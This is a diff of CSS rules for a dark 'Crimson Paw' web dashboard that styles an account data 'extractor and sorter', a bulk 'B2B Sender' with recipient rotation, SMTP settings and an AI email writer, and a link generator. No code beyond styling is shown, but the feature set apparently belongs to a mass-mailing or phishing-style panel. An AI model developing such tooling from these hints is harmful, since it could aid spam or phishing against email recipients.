+        .settings-nav-item { padding: 10px 14px; border-radius: 4px; cursor: pointer; font-size: 13px; font-weight: 600; color: #323130; transition: background 0.15s; }
+        .settings-nav-item:hover { background: #edebe9; }
+        .settings-nav-item.active { background: #e1dfdd; color: #0078d4; }
+        .settings-card { background: #f8f9fa; border: 1px solid var(--border-color); border-radius: 6px; padding: 16px; margin-bottom: 14px; font-size: 13px; }
+        .settings-card h4 { margin-bottom: 8px; color: #201f1e; }
+
+        /* ── Extractor & Sorter Page (CRIMSON PAW THEME) ─────────── */
+        .extractor-viewport { display: flex; flex-direction: column; height: 100%; background: #0a0709; color: #f0ebed; font-family: 'Segoe UI', monospace; overflow: hidden; }
+        .extractor-top-bar { display: flex; align-items: center; justify-content: space-between; padding: 14px 24px; background: #161014; border-bottom: 1px solid #38161b; flex-shrink: 0; gap: 16px; }
+        .extractor-title { font-size: 1.1em; font-weight: 800; color: #ffffff; letter-spacing: 0.05em; display: flex; align-items: center; gap: 10px; }
+        .extractor-tabs { display: flex; gap: 4px; }
+        .extractor-tab { padding: 7px 20px; border-radius: 6px 6px 0 0; cursor: pointer; font-size: 0.88em; font-weight: 700; color: #a49498; border: 1px solid transparent; border-bottom: none; transition: all 0.15s; }
+        .extractor-tab.active { background: #0a0709; color: #ffffff; border-color: #38161b; border-bottom: 2px solid #e50914; }
+        .extractor-tab:hover:not(.active) { background: #1f1418; color: #ffffff; }
+        .account-selector-pill { background: #161014; border: 1px solid #38161b; border-radius: 20px; padding: 6px 16px; font-size: 0.82em; color: #f0ebed; outline: none; cursor: pointer; max-width: 280px; }
+        .account-selector-pill:focus { border-color: #e50914; }
+        .extractor-body { flex: 1; display: flex; flex-direction: column; overflow: hidden; }
+        .extractor-panel { display: none; flex: 1; flex-direction: column; overflow: hidden; padding: 20px 24px; gap: 16px; }
+        .extractor-panel.active { display: flex; }
+        .extractor-controls-row { display: flex; align-items: flex-start; gap: 20px; flex-wrap: wrap; }
+        .category-card { background: #161014; border: 1px solid #38161b; border-radius: 10px; padding: 18px 22px; display: flex; align-items: flex-start; gap: 14px; cursor: pointer; transition: all 0.2s; min-width: 240px; flex: 1; max-width: 340px; user-select: none; box-shadow: 0 4px 14px rgba(0,0,0,0.4); }
+        .category-card:hover { border-color: #e50914; background: #1c1217; transform: translateY(-1px); }
+        .category-card.selected { border-color: #e50914; background: #261116; box-shadow: 0 0 16px rgba(229, 9, 20, 0.25); }
+        .category-checkbox { width: 20px; height: 20px; border-radius: 4px; border: 2px solid #5a1c22; display: flex; align-items: center; justify-content: center; flex-shrink: 0; margin-top: 2px; transition: all 0.15s; font-size: 13px; color: white; background: transparent; }
+        .category-card.selected .category-checkbox { background: #e50914; border-color: #e50914; }
+        .category-card.selected .category-checkbox::after { content: '✓'; }
+        .category-info-title { font-weight: 700; font-size: 0.95em; color: #ffffff; margin-bottom: 4px; }
+        .category-info-desc { font-size: 0.8em; color: #a49498; line-height: 1.45; }
+        .extractor-btn-group { display: flex; gap: 10px; align-items: center; flex-wrap: wrap; }
+        .ext-btn { display: flex; align-items: center; gap: 8px; padding: 9px 20px; border-radius: 8px; border: none; cursor: pointer; font-size: 0.88em; font-weight: 700; transition: all 0.15s; }
+        .ext-btn-start { background: linear-gradient(135deg, #e50914, #b00710); color: #fff; box-shadow: 0 2px 12px rgba(229, 9, 20, 0.4); }
+        .ext-btn-start:hover { background: linear-gradient(135deg, #ff1f2a, #cc0813); box-shadow: 0 0 16px rgba(229, 9, 20, 0.6); transform: translateY(-1px); }
+        .ext-btn-start:disabled { background: #261115; color: #6e5c61; cursor: not-allowed; box-shadow: none; transform: none; }
+        .ext-btn-download { background: #1c1217; color: #ff6b72; border: 1px solid #38161b; }
+        .ext-btn-download:hover { background: #261115; border-color: #e50914; color: #ffffff; }
+        .ext-btn-download:disabled { color: #5a4b4f; cursor: not-allowed; border-color: #261115; }
+        .ext-btn-reset { background: transparent; color: #a49498; border: 1px solid #38161b; }
+        .ext-btn-reset:hover { color: #ff3b45; border-color: #e50914; }
+        .ext-counters { display: flex; gap: 20px; align-items: center; font-size: 0.82em; font-weight: 600; font-family: 'Courier New', monospace; margin-left: auto; }
+        .ext-counter-chip { background: #161014; border: 1px solid #38161b; border-radius: 20px; padding: 5px 14px; color: #ff6b72; }
+        .ext-counter-chip span { color: #ffffff; font-weight: 800; }
+        .terminal-pane { flex: 1; background: #0c0709; border: 1px solid #38161b; border-radius: 10px; overflow-y: auto; padding: 16px 18px; font-family: 'Courier New', Consolas, monospace; font-size: 0.82em; line-height: 1.65; min-height: 200px; box-shadow: inset 0 2px 8px rgba(0,0,0,0.6); }
+        .terminal-line { display: flex; gap: 10px; animation: termFadeIn 0.1s ease; }
+        .terminal-line.header { color: #ff3b45; font-weight: 700; }
+        .terminal-line.success { color: #3fb950; }
+        .terminal-line.warn { color: #d29922; }
+        .terminal-line.error { color: #f85149; }
+        .terminal-line.dim { color: #6e5c61; }
+        .term-ts { color: #6e5c61; flex-shrink: 0; }
+        .term-txt { word-break: break-all; flex: 1; }
+        @keyframes termFadeIn { from { opacity: 0; transform: translateY(2px); } to { opacity: 1; transform: translateY(0); } }
+        .progress-bar-outer { height: 4px; background: #261115; border-radius: 2px; overflow: hidden; }
+        .progress-bar-inner { height: 100%; background: linear-gradient(90deg, #e50914, #ff4d58); border-radius: 2px; transition: width 0.3s ease; }
+        .sorter-upload-zone { background: #161014; border: 2px dashed #38161b; border-radius: 10px; padding: 32px; text-align: center; cursor: pointer; transition: all 0.2s; }
+        .sorter-upload-zone:hover, .sorter-upload-zone.drag-over { border-color: #e50914; background: #261116; box-shadow: 0 0 20px rgba(229, 9, 20, 0.2); }
+        .sorter-upload-zone input[type=file] { display: none; }
+        .sorter-upload-icon { font-size: 2.5em; margin-bottom: 10px; }
+        .sorter-upload-label { font-size: 0.9em; color: #a49498; }
+        .sorter-upload-label strong { color: #ffffff; }
+        .domain-group-header { display: flex; align-items: center; gap: 10px; padding: 6px 0 4px; color: #ff3b45; font-weight: 700; font-size: 0.88em; border-bottom: 1px solid #38161b; margin-bottom: 4px; }
+        .domain-badge { background: #261115; border: 1px solid #5a1c22; border-radius: 20px; padding: 2px 10px; font-size: 0.78em; color: #ff8b94; font-weight: 700; }
+
+        /* ── B2B Sender (CRIMSON PAW THEME) ───────────────────────── */
+        .b2b-viewport { display:flex; flex-direction:column; height:100%; background:#0a0709; color:#f0ebed; font-family:'Segoe UI',sans-serif; overflow:hidden; }
+        .b2b-top-bar { display:flex; align-items:center; background:#130a0d; border-bottom:1px solid #38161b; padding:0 18px; height:46px; gap:14px; flex-shrink:0; }
+        .b2b-brand { font-size:.97em; font-weight:800; color:#ffffff; letter-spacing:.04em; white-space:nowrap; }
+        .b2b-chips { display:flex; gap:7px; align-items:center; }
+        .b2b-chip { background:#241116; border:1px solid #5a1c22; border-radius:20px; padding:4px 11px; font-size:.73em; font-weight:700; color:#ff8b94; cursor:pointer; letter-spacing:.05em; transition:all .15s; white-space:nowrap; }
+        .b2b-chip:hover { background:#3d1419; border-color:#e50914; color:#ffffff; }
+        .b2b-chip-muted { background:#161014; border-color:#38161b; color:#a49498; }
+        .b2b-chip-muted:hover { border-color:#e50914; color:#ffffff; }
+        .b2b-account-select { margin-left:auto; background:#161014; border:1px solid #38161b; border-radius:20px; padding:5px 13px; font-size:.8em; color:#f0ebed; outline:none; cursor:pointer; max-width:240px; }
+        .b2b-account-select:focus { border-color:#e50914; }
+        .b2b-campaign-bar { padding:8px 18px; background:#0a0709; border-bottom:1px solid #2e1216; flex-shrink:0; }
+        .b2b-field-label { font-size:.69em; font-weight:700; color:#a49498; letter-spacing:.1em; margin-bottom:4px; }
+        .b2b-campaign-input { width:100%; background:#161014; border:1px solid #38161b; border-radius:5px; padding:7px 11px; color:#ffffff; font-size:.88em; outline:none; box-sizing:border-box; transition:border-color .15s; }
+        .b2b-campaign-input:focus { border-color:#e50914; box-shadow: 0 0 8px rgba(229, 9, 20, 0.3); }
+        .b2b-ticker-wrap { background:#11080a; border-bottom:1px solid #2e1216; padding:5px 18px; overflow:hidden; white-space:nowrap; flex-shrink:0; }
+        .b2b-ticker-inner { display:inline-block; animation:b2bTicker 30s linear infinite; font-size:.74em; color:#ff6b72; font-weight:600; }
+        @keyframes b2bTicker { 0%{transform:translateX(100vw)} 100%{transform:translateX(-100%)} }
+        .b2b-main-body { display:flex; flex:1; overflow:hidden; min-height:0; width:100%; }
+        
+        /* ── Column 1: Recipients List (Generous Breathing Space) ── */
+        .b2b-col-recipients { width:300px; min-width:270px; max-width:340px; background:#0f080b; border-right:1px solid #2e1216; display:flex; flex-direction:column; flex-shrink:0; padding:12px; gap:8px; box-sizing:border-box; }
+        .b2b-panel-header { display:flex; justify-content:space-between; align-items:center; font-size:.74em; font-weight:700; color:#ffffff; letter-spacing:.08em; }
+        .b2b-bcc-row { display:flex; align-items:center; gap:6px; cursor:pointer; }
+        .b2b-bcc-label { font-size:.8em; color:#e2e8f0; font-weight:600; }
+        .b2b-sw { width:28px; height:14px; background:#261115; border-radius:10px; position:relative; transition:background .2s; border:1px solid #5a1c22; flex-shrink:0; }
+        .b2b-sw::after { content:''; position:absolute; width:10px; height:10px; background:#a49498; border-radius:50%; top:1px; left:1px; transition:all .2s; }
+        .b2b-sw.on { background:#b00710; border-color:#e50914; }
+        .b2b-sw.on::after { background:#ffffff; left:15px; }
+        .b2b-rec-area { flex:1; min-height:260px; background:#120b0e; border:1px solid #38161b; border-radius:6px; color:#ffffff; font-size:12px; padding:10px; resize:none; outline:none; font-family:'Consolas','Courier New',monospace; line-height:1.6; white-space:pre; width:100%; box-sizing:border-box; }
+        .b2b-rec-area:focus { border-color:#e50914; box-shadow:0 0 8px rgba(229,9,20,0.25); }
+        .b2b-rec-btns { display:flex; gap:5px; }
+        .b2b-sm-btn { flex:1; background:#201115; border:1px solid #38161b; border-radius:4px; color:#ffffff; font-size:.73em; font-weight:700; padding:6px 2px; cursor:pointer; letter-spacing:.04em; transition:all .15s; }
+        .b2b-sm-btn:hover { background:#3d1419; border-color:#e50914; color:#ffffff; }
+        .b2b-sm-btn-danger { color:#fca5a5; }
+        .b2b-sm-btn-danger:hover { background:#450a0a; border-color:#e50914; color:#ffffff; }
+        .b2b-rec-count { font-size:.74em; color:#cbd5e1; text-align:center; font-weight:600; }
+        
+        /* ── Column 2: Campaign Parameters & Controls (Spacious & Non-overflowing) ── */
+        .b2b-col-params { width:365px; min-width:330px; max-width:420px; background:#0c0709; border-right:1px solid #2e1216; display:flex; flex-direction:column; flex-shrink:0; padding:14px 14px 18px; gap:12px; overflow-y:auto; box-sizing:border-box; height:100%; }
+        
+        /* ── Column 3: Full Static Canvas Touching Right Edge ── */
+        .b2b-compose-panel { flex:1; height:100%; display:flex; flex-direction:column; padding:10px 14px; overflow:hidden; background:#0a0608; box-sizing:border-box; min-width:0; }
+        .b2b-body-container { width:100%; height:100%; display:flex; flex-direction:column; overflow:hidden; gap:0; }
+        
+        .b2b-field-section { display:flex; flex-direction:column; gap:6px; }
+        .b2b-compose-label { font-size:.72em; font-weight:700; color:#ffffff; letter-spacing:.08em; }
+        .b2b-dim { color:#cbd5e1; font-size:.82em; }
+        .b2b-mini-ta { background:#120b0e; border:1px solid #38161b; border-radius:6px; color:#ffffff; font-size:12px; padding:8px 10px; resize:vertical; outline:none; font-family:'Consolas','Courier New',monospace; line-height:1.5; min-height:64px; height:68px; width:100%; box-sizing:border-box; }
+        .b2b-mini-ta:focus { border-color:#e50914; box-shadow:0 0 8px rgba(229,9,20,0.25); }
+        .b2b-rotate-row { display:flex; align-items:center; gap:8px; font-size:.75em; color:#cbd5e1; margin-top:4px; }
+        .b2b-counter { display:flex; align-items:center; }
+        .b2b-counter button { background:#261115; border:1px solid #38161b; color:#ffffff; width:22px; height:22px; cursor:pointer; font-size:.9em; display:flex; align-items:center; justify-content:center; }
+        .b2b-counter button:first-child { border-radius:3px 0 0 3px; }
+        .b2b-counter button:last-child { border-radius:0 3px 3px 0; }
+        .b2b-counter button:hover { background:#e50914; border-color:#e50914; }
+        .b2b-counter-input { width:32px; height:22px; background:#0a0709; border:1px solid #38161b; border-left:none; border-right:none; color:#ffffff; text-align:center; font-size:.8em; outline:none; }
+        
+        .b2b-body-header { display:flex; justify-content:space-between; align-items:center; margin-bottom:5px; flex-wrap:wrap; gap:6px; }
+        .b2b-body-actions { display:flex; align-items:center; gap:5px; flex-wrap:wrap; }
+        .b2b-ai-btn { background:linear-gradient(135deg,#e50914,#b00710); color:#ffffff; border:none; border-radius:5px; padding:4px 10px; font-size:.75em; font-weight:700; cursor:pointer; transition:all .15s; box-shadow:0 0 10px rgba(229,9,20,0.3); }
+        .b2b-ai-btn:hover { box-shadow:0 0 16px rgba(229,9,20,0.6); transform:translateY(-1px); }
+        .b2b-import-btn { background:#1e1014; border:1px solid #5a1c22; border-radius:5px; padding:4px 10px; font-size:.75em; font-weight:700; color:#ffffff; cursor:pointer; transition:all .15s; display:inline-flex; align-items:center; gap:5px; }
+        .b2b-import-btn:hover { background:#38141b; border-color:#e50914; color:#ffffff; box-shadow:0 0 12px rgba(229,9,20,0.35); }
+        .b2b-edit-tabs { display:flex; border:1px solid #38161b; border-radius:4px; overflow:hidden; }
+        .b2b-edit-tab { padding:4px 10px; font-size:.72em; font-weight:700; cursor:pointer; color:#a49498; transition:all .15s; }
+        .b2b-edit-tab.active { background:#e50914; color:#ffffff; }
+        .b2b-edit-tab:hover:not(.active) { background:#261115; color:#ffffff; }
+        .b2b-editor-toolbar { display:flex; align-items:center; gap:3px; background:#161014; border:1px solid #38161b; border-bottom:none; padding:5px 8px; border-radius:6px 6px 0 0; flex-wrap:wrap; }
+        .b2b-tb-btn { background:transparent; border:1px solid transparent; color:#ffffff; border-radius:3px; padding:3px 6px; font-size:.8em; cursor:pointer; transition:all .1s; }
+        .b2b-tb-btn:hover { background:#261115; border-color:#5a1c22; }
+        .b2b-tb-sep { width:1px; height:16px; background:#38161b; margin:0 3px; flex-shrink:0; }
+        .b2b-tb-sel { background:#0a0709; border:1px solid #38161b; color:#ffffff; border-radius:3px; font-size:.75em; padding:2px 4px; cursor:pointer; outline:none; }
+        .b2b-merge-tags { display:flex; gap:3px; margin-left:4px; flex-wrap:wrap; }
+        .b2b-merge-btn { background:rgba(229,9,20,0.16); border:1px solid rgba(229,9,20,0.45); border-radius:4px; color:#ffffff; font-size:.72em; font-weight:700; padding:2px 5px; cursor:pointer; font-family:'Consolas',monospace; transition:all .12s; }
+        .b2b-merge-btn:hover { background:#e50914; border-color:#ff3b45; color:#ffffff; box-shadow:0 0 10px rgba(229,9,20,0.5); transform:translateY(-1px); }
+        
+        .b2b-editor-area { border:1px solid #38161b; border-radius:0 0 6px 6px; background:#ffffff; flex:1; height:100%; min-height:0; display:flex; flex-direction:column; overflow:hidden; }
+        .b2b-editor-content { flex:1; height:100%; overflow-y:auto; padding:18px 24px; outline:none; font-size:14px; color:#1a1a1a; line-height:1.6; box-sizing:border-box; }
+        .b2b-editor-content * { max-width:100% !important; box-sizing:border-box !important; }
+        .b2b-editor-content img { max-width:100% !important; height:auto !important; }
+        .b2b-editor-content table { max-width:100% !important; width:100% !important; }
+        .b2b-editor-content .b2b-card-outer, .b2b-editor-content .b2b-email-card { max-width:350px !important; width:350px !important; margin:12px auto !important; }
+        .b2b-editor-content:empty::before { content:attr(placeholder); color:#9ca3af; }
+        .b2b-editor-content:empty::before { content:attr(placeholder); color:#9ca3af; }
+        
+        .b2b-preview-wrap { width:100%; height:100%; flex:1; background:#f1f5f9; display:flex; justify-content:center; align-items:flex-start; overflow-y:auto; padding:14px; box-sizing:border-box; }
+        .b2b-preview-frame { width:100%; height:100%; border:none; display:block; background:#ffffff; border-radius:6px; box-shadow:0 2px 14px rgba(0,0,0,0.08); transition:max-width .2s ease; }
+        .b2b-preview-wrap.mobile .b2b-preview-frame { max-width:375px; margin:0 auto; box-shadow:0 6px 24px rgba(0,0,0,0.25); }
+        .b2b-prev-btn { background:#161014; border:1px solid #38161b; color:#cbd5e1; border-radius:4px; padding:3px 8px; font-size:.74em; font-weight:600; cursor:pointer; transition:all .15s; }
+        .b2b-prev-btn:hover, .b2b-prev-btn.active { background:#e50914; border-color:#e50914; color:#ffffff; }
+        
+        /* ── Fullscreen Focus Mode ─────────────────────────────── */
+        .b2b-body-container.b2b-fullscreen { position:fixed; inset:0; z-index:99999; background:#100b0e; padding:16px 20px; max-width:100vw; height:100vh; box-sizing:border-box; gap:6px; }
+        .b2b-body-container.b2b-fullscreen .b2b-editor-area { flex:1; height:100%; min-height:0; }
+
+        .b2b-option-row { display:flex; align-items:center; gap:10px; padding:7px 0; font-size:.78em; }
+        .b2b-option-row-border { border-top:1px solid #241115; }
+        .b2b-option-label { font-size:.7em; font-weight:700; color:#ffffff; letter-spacing:.05em; min-width:130px; }
+        .b2b-tg { display:flex; border:1px solid #38161b; border-radius:4px; overflow:hidden; cursor:pointer; }
+        .b2b-tg-opt { padding:3px 9px; font-size:.74em; font-weight:700; color:#a49498; transition:all .15s; }
+        .b2b-tg-opt.active { background:#e50914; color:#ffffff; }
+        .b2b-add-files-btn { background:#261115; border:1px solid #38161b; border-radius:4px; color:#ffffff; font-size:.72em; font-weight:700; padding:5px 9px; cursor:pointer; }
+        .b2b-add-files-btn:hover { border-color:#e50914; background:#38141b; color:#ffffff; }
+        .b2b-badge { background:#241116; border:1px solid #5a1c22; border-radius:3px; color:#ff8b94; font-size:.66em; padding:1px 4px; font-weight:700; }
+        
+        .b2b-sidebar-actions { display:flex; flex-direction:column; gap:10px; padding-top:10px; border-top:1px solid #241115; }
+        .b2b-send-btn { background:linear-gradient(135deg,#e50914,#b00710); color:#ffffff; border:1px solid rgba(255,255,255,0.15); border-radius:5px; font-size:.86em; font-weight:700; padding:10px 16px; cursor:pointer; transition:all .15s; display:flex; align-items:center; justify-content:center; gap:7px; box-shadow:0 0 14px rgba(229,9,20,0.4); letter-spacing:.04em; }
+        .b2b-send-btn:hover { box-shadow:0 0 20px rgba(229,9,20,0.7); transform:translateY(-1px); }
+        .b2b-send-btn:disabled { background:#261115; color:#6e5c61; cursor:not-allowed; box-shadow:none; border-color:#38161b; }
+        .b2b-save-btn { background:#1e1014; border:1px solid #38161b; border-radius:5px; color:#cbd5e1; font-size:.78em; font-weight:600; padding:6px 10px; cursor:pointer; }
+        .b2b-save-btn:hover { border-color:#e50914; color:#ffffff; }
+        .b2b-reset-btn { background:transparent; border:1px solid #38161b; border-radius:5px; color:#cbd5e1; font-size:.78em; font-weight:700; padding:6px 10px; cursor:pointer; }
+        .b2b-reset-btn:hover { border-color:#e50914; color:#ff4d58; }
+
+        /* ── Column 2 Output Section & Counters ──────────────────── */
+        .b2b-output-section { display:flex; flex-direction:column; flex:1; border-top:1px solid #241115; padding-top:10px; margin-top:2px; min-height:120px; }
+        .b2b-output-header { display:flex; flex-direction:column; gap:8px; margin-bottom:10px; }
+        .b2b-output-title { font-size:.74em; font-weight:800; color:#ffffff; letter-spacing:.08em; text-transform:uppercase; }
+        .b2b-out-counters { display:flex; align-items:stretch; justify-content:space-between; gap:12px; width:100%; box-sizing:border-box; }
+        .b2b-out-chip { flex:1; background:linear-gradient(180deg, #180e12, #10080c); border:1px solid #38161b; border-radius:6px; padding:9px 8px; text-align:center; display:flex; flex-direction:column; align-items:center; justify-content:center; gap:5px; box-sizing:border-box; transition:all .15s; }
+        .b2b-out-chip:hover { border-color:#e50914; background:#1e1116; transform:translateY(-1px); box-shadow:0 3px 10px rgba(0,0,0,0.4); }
+        .b2b-out-chip-label { text-transform:uppercase; font-size:.70em; font-weight:700; letter-spacing:.08em; color:#a49498; }
+        .b2b-out-chip-val { font-family:'Consolas','Courier New',monospace; font-size:1.3em; font-weight:800; line-height:1; }
+        .b2b-output-section .terminal-pane { border-radius:6px; min-height:85px; flex:1; overflow-y:auto; padding:8px 10px; font-size:11px; background:#090507; border:1px solid #2e1216; box-sizing:border-box; }
+
+        /* ── Import Template Modal ───────────────────────────────── */
+        .b2b-import-modal { position:fixed; inset:0; background:rgba(0,0,0,.85); z-index:10001; display:flex; align-items:center; justify-content:center; backdrop-filter:blur(6px); }
+        .b2b-import-box { background:linear-gradient(145deg,#161014,#200e13); border:1px solid #4a181e; border-radius:14px; width:720px; max-width:95vw; max-height:88vh; display:flex; flex-direction:column; overflow:hidden; box-shadow:0 0 60px rgba(229,9,20,.35); }
+        .b2b-import-hdr { display:flex; align-items:center; gap:10px; padding:16px 20px; border-bottom:1px solid #38161b; }
+        .b2b-import-title { font-size:1.02em; font-weight:800; color:#ffffff; letter-spacing:.02em; display:flex; align-items:center; gap:8px; }
+        .b2b-import-sub { font-size:.78em; color:#cbd5e1; margin-top:2px; }
+        .b2b-import-close { margin-left:auto; background:none; border:none; color:#a49498; font-size:1.2em; cursor:pointer; transition:color .15s; }
+        .b2b-import-close:hover { color:#ff3b45; }
+        .b2b-import-search-bar { padding:10px 20px; background:#10090c; border-bottom:1px solid #2e1216; }
+        .b2b-import-search-input { width:100%; background:#161014; border:1px solid #38161b; border-radius:6px; padding:7px 12px; color:#ffffff; font-size:.85em; outline:none; box-sizing:border-box; }
+        .b2b-import-search-input:focus { border-color:#e50914; box-shadow:0 0 8px rgba(229,9,20,0.3); }
+        .b2b-import-body { padding:16px 20px; overflow-y:auto; display:flex; flex-direction:column; gap:10px; }
+        .b2b-import-card { background:#11080a; border:1px solid #2e1216; border-radius:8px; padding:12px 16px; display:flex; align-items:center; justify-content:space-between; gap:14px; transition:all .15s; }
+        .b2b-import-card:hover { border-color:#e50914; background:#1a0c10; transform:translateY(-1px); box-shadow:0 4px 16px rgba(0,0,0,0.4); }
+        .b2b-import-card-info { display:flex; flex-direction:column; gap:4px; min-width:0; flex:1; }
+        .b2b-import-card-name { font-size:.92em; font-weight:700; color:#ffffff; display:flex; align-items:center; gap:8px; }
+        .b2b-import-badge { font-size:.7em; font-weight:700; padding:2px 7px; border-radius:12px; background:rgba(229,9,20,0.2); border:1px solid rgba(229,9,20,0.5); color:#ffffff; }
+        .b2b-import-card-url { font-family:'Consolas','Courier New',monospace; font-size:.78em; color:#93c5fd; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; }
+        .b2b-import-card-meta { font-size:.72em; color:#cbd5e1; }
+        .b2b-import-select-btn { background:linear-gradient(135deg,#e50914,#b00710); color:#ffffff; border:1px solid rgba(255,255,255,0.15); border-radius:6px; font-size:.78em; font-weight:700; padding:7px 14px; cursor:pointer; white-space:nowrap; transition:all .15s; box-shadow:0 0 8px rgba(229,9,20,0.3); }
+        .b2b-import-select-btn:hover { box-shadow:0 0 16px rgba(229,9,20,0.6); transform:translateY(-1px); }
+
+        /* ── SOURCE tab textarea ─────────────────────────────────────── */
+        .b2b-source-ta { width:100%; height:100%; flex:1; background:#0c0709; color:#ff8b94; font-family:'Consolas','Courier New',monospace; font-size:.85em; line-height:1.6; padding:18px 22px; border:none; outline:none; resize:none; box-sizing:border-box; overflow-y:auto; }
+
+        /* ── Send mode + SMTP settings ──────────────────────────── */
+        .b2b-sendmode-wrap { display:flex; align-items:center; gap:6px; background:#161014; border:1px solid #38161b; border-radius:6px; padding:4px 8px; width:100%; box-sizing:border-box; }
+        .b2b-sendmode-sel { background:transparent; border:none; color:#f0ebed; font-size:.78em; outline:none; cursor:pointer; flex:1; }
+        .b2b-smtp-cfg-btn { background:#261115; border:1px solid #5a1c22; border-radius:4px; color:#ff8b94; font-size:.72em; padding:3px 7px; cursor:pointer; white-space:nowrap; transition:all .15s; }
+        .b2b-smtp-cfg-btn:hover { background:#3d1419; border-color:#e50914; color:#ffffff; }
+
+        /* ── AI Email Writer modal ──────────────────────────── */
+        .ai-modal { position:fixed; inset:0; background:rgba(0,0,0,.85); z-index:10000; display:flex; align-items:center; justify-content:center; backdrop-filter:blur(6px); }
+        .ai-modal-box { background:linear-gradient(145deg,#161014,#200e13); border:1px solid #4a181e; border-radius:14px; width:640px; max-width:95vw; max-height:92vh; display:flex; flex-direction:column; overflow:hidden; box-shadow:0 0 60px rgba(229,9,20,.35); }
+        .ai-modal-hdr { display:flex; align-items:center; gap:10px; padding:16px 20px; border-bottom:1px solid #38161b; }
+        .ai-modal-title { font-size:1em; font-weight:800; color:#ffffff; letter-spacing:.02em; }
+        .ai-modal-close { margin-left:auto; background:none; border:none; color:#a49498; font-size:1.1em; cursor:pointer; transition:color .15s; }
+        .ai-modal-close:hover { color:#ff3b45; }
+        .ai-modal-body { padding:18px 20px; display:flex; flex-direction:column; gap:14px; overflow-y:auto; }
+        .ai-section-label { font-size:.69em; font-weight:700; color:#a49498; letter-spacing:.08em; margin-bottom:4px; }
+        .ai-instruction-area { background:#0c0709; border:1px solid #38161b; border-radius:8px; color:#ffffff; font-size:.88em; padding:12px 14px; resize:vertical; outline:none; min-height:100px; font-family:'Segoe UI',sans-serif; line-height:1.6; transition:border-color .15s; width:100%; box-sizing:border-box; }
+        .ai-instruction-area:focus { border-color:#e50914; box-shadow:0 0 0 2px rgba(229,9,20,.2); }
+        .ai-instruction-area::placeholder { color:#6e5c61; }
+        .ai-opts-row { display:flex; gap:10px; flex-wrap:wrap; }
+        .ai-opt-group { display:flex; flex-direction:column; gap:4px; flex:1; min-width:120px; }
+        .ai-select { background:#0c0709; border:1px solid #38161b; border-radius:6px; color:#f0ebed; font-size:.82em; padding:6px 10px; outline:none; cursor:pointer; }
+        .ai-select:focus { border-color:#e50914; }
+        .ai-preview-area { background:#0c0709; border:1px solid #38161b; border-radius:8px; padding:14px; min-height:120px; max-height:280px; overflow-y:auto; font-size:.84em; color:#f0ebed; font-family:'Courier New',monospace; line-height:1.6; white-space:pre-wrap; word-break:break-word; }
+        .ai-preview-area.generating { border-color:#e50914; box-shadow:0 0 0 2px rgba(229,9,20,.15); }
+        .ai-cursor { display:inline-block; width:2px; height:1em; background:#ff4d58; animation:aiCursor .7s infinite; vertical-align:middle; margin-left:1px; }
+        @keyframes aiCursor { 0%,100%{opacity:1} 50%{opacity:0} }
+        .ai-modal-footer { padding:12px 20px; border-top:1px solid #38161b; display:flex; gap:10px; align-items:center; }
+        .ai-gen-btn { background:linear-gradient(135deg,#e50914,#b00710); color:white; border:1px solid rgba(255,255,255,0.15); border-radius:8px; font-size:.88em; font-weight:700; padding:8px 20px; cursor:pointer; transition:all .2s; display:flex; align-items:center; gap:8px; box-shadow:0 0 12px rgba(229,9,20,0.3); }
+        .ai-gen-btn:hover { box-shadow:0 0 20px rgba(229,9,20,.6); transform:translateY(-1px); }
+        .ai-gen-btn:disabled { background:#261115; color:#6e5c61; cursor:not-allowed; transform:none; box-shadow:none; border-color:#38161b; }
+        .ai-insert-btn { background:transparent; border:1px solid #3fb950; border-radius:8px; color:#3fb950; font-size:.88em; font-weight:700; padding:8px 18px; cursor:pointer; transition:all .15s; }
+        .ai-insert-btn:hover { background:#3fb950; color:#0a0709; }
+        .ai-insert-btn:disabled { border-color:#38161b; color:#6e5c61; cursor:not-allowed; }
+        .ai-key-hint { font-size:.72em; color:#6e5c61; margin-left:auto; }
+        .ai-spinner { width:16px; height:16px; border:2px solid rgba(255,255,255,.3); border-top-color:white; border-radius:50%; animation:spin .6s linear infinite; }
+        @keyframes spin { to{transform:rotate(360deg)} }
+        .ai-no-key-banner { background:#261115; border:1px solid #631c25; border-radius:6px; padding:10px 14px; font-size:.8em; color:#ff6b72; }
+        .ai-no-key-banner a { color:#ff8b94; }
+
+        /* ─── LINK GENERATOR OBSIDIAN-CRIMSON WORKSPACE ─── */
+        .lg-container { background: radial-gradient(circle at 50% 0%, #200d12 0%, #0a0608 100%); min-height: 100%; color: #f1ecf7; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; padding: 20px 28px; box-sizing: border-box; overflow-y: auto; }
+        .lg-top-header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 20px; }
+        .lg-top-left { display: flex; align-items: center; gap: 20px; }
+        .lg-page-title { font-size: 1.15rem; font-weight: 700; color: #ffffff; display: flex; align-items: center; gap: 8px; }
+        .lg-subnav { display: flex; gap: 8px; align-items: center; }
+        .lg-nav-tab { padding: 6px 14px; border-radius: 6px; font-size: 0.8rem; font-weight: 600; cursor: pointer; background: #160e12; color: #a49498; border: 1px solid #38161b; transition: all 0.15s ease; display: flex; align-items: center; gap: 6px; text-decoration: none; }
+        .lg-nav-tab:hover { color: #ffffff; border-color: #7a1d24; }
+        .lg-nav-tab.active { background: #2b1115; color: #ffffff; border-color: #e50914; box-shadow: 0 0 12px rgba(229, 9, 20, 0.35); }
+        .lg-section-title { font-size: 1rem; font-weight: 700; color: #ffffff; display: flex; align-items: center; gap: 8px; margin-bottom: 12px; }
+        .lg-main-split { display: grid; grid-template-columns: 37% 63%; gap: 24px; align-items: start; margin-bottom: 24px; }
+        .lg-controls-pane { 
+            background: #140d10; 
+            border: 1px solid #38161b; 
+            border-radius: 10px; 
+            padding: 20px; 
+            display: flex; 
+            flex-direction: column; 
+            gap: 14px; 
+            box-shadow: 0 4px 20px rgba(0,0,0,0.5);
+        }
+        .lg-form-group { display: flex; flex-direction: column; gap: 6px; }
+        .lg-label { font-size: 0.72rem; font-weight: 700; text-transform: uppercase; letter-spacing: 0.6px; color: #a49498; }
+        .lg-input-wrap { position: relative; display: flex; align-items: center; }
+        .lg-input, .lg-select, .lg-textarea { width: 100%; background: #0c0709; border: 1px solid #38161b; border-radius: 6px; color: #ffffff; padding: 8px 12px; font-size: 0.85rem; font-family: inherit; outline: none; transition: border-color 0.15s; box-sizing: border-box; }
+        .lg-textarea { resize: vertical; min-height: 54px; }
+        .lg-input:focus, .lg-select:focus, .lg-textarea:focus { border-color: #e50914; box-shadow: 0 0 0 1px #e50914; }
